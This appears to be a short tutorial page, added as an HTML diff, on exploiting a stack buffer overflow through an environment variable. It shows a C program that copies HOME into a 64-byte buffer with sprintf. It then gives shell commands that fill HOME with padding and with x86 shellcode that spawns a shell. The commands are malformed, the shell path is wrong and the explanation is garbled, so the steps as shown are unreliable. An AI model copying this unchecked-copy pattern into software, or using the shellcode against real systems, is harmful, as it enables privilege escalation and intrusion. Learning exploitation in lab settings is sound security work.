@@ -1,0 +1,31 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Environmental Buffer Overflow</title>
+</head><body><span style="font-size: 20pt">Using environmental variables requires the program to use and have access to environmental varibales, many don't<br/>
+</span><span style="font-size: 14pt"><br/>
+</span><span style="font-size: 14pt">Example of a program that uses environmental variable</span><span style="font-size: 20pt"><br/>
+</span>#include &lt;stdio.h&gt; <br/>
+#include &lt;stdlib.h&gt; <br/>
+<br/>
+int main(void) <br/>
+{ <ul><li style="list-style-type: none">char *ptr_h; char h[64]; </li>
+<li style="list-style-type: none">ptr_h = <b>getenv</b>(&quot;HOME&quot;); </li>
+</ul>
+<br/>
+if(ptr_h != NULL) { <br/>
+<ul><li style="list-style-type: none"><ul><li style="list-style-type: none">sprintf(h, &quot;Your home directory is: %s !&quot;, ptr_h); </li>
+<li style="list-style-type: none">printf(&quot;%s\n&quot;, h); </li>
+</ul>
+</li>
+<li style="list-style-type: none">} </li>
+<li style="list-style-type: none">return 0; </li>
+</ul>
+} <br/>
+<br/>
+$ export HOME=perl -e ‘print “A”x128’``<br/>
+<img height="78" src="image.png" width="650"/><br/>
+So lets enter some shellcode to get a shell (/bin/bash/)<br/>
+$ export HOME=perl -e 'print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69 \x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;'<br/>
+<br/>
+<span style="font-size: 14pt">We are abusing a pointer in this (<div style="text-align: left"><span style="font-family: Roboto">EIP, ESP, and EBP</span></div>) redirecting the pointer</span></body></html>
